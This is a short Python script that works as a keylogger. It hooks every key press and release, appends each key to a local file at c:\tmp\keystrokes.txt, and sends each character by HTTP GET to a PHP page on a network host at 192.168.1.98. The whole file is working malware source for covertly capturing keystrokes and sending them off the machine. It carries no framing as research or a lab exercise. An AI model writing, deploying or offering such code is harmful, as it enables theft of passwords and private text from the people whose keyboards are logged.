#from pynput import keyboard
#----------------------
import keyboard
import queue

#----------
import requests

url = 'http://192.168.1.98/writefile.php'

def sendToPHPpage(url, text_to_send):
    #text_to_send = 'test'
    params = {'text_': text_to_send}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        print("Request sent successfully")
    else:
     print(f"Failed to send request. Status code: {response.status_code}")

#----------

def on_key_event(e):
    print(f"Key {e.name} {'pressed' if e.event_type == keyboard.KEY_DOWN else 'released'}")
    if e.name == 'enter':
        newLine = 1
    else:
        newLine = 0
    write_to_file(e.name, newLine)

def write_to_file(keys, newLine):
    with open('c:\\tmp\\keystrokes.txt', 'a') as file:
        for key in keys:
            file.write(key)
            sendToPHPpage(url,key)
        if newLine == 1:
            file.write('\n')
            sendToPHPpage(url,'\n')



keyboard.on_press(on_key_event)
keyboard.on_release(on_key_event)

print("Listening for keyboard events. Press 'Esc' to exit.")

# Keep the script running until 'Esc' is pressed
keyboard.wait('esc')
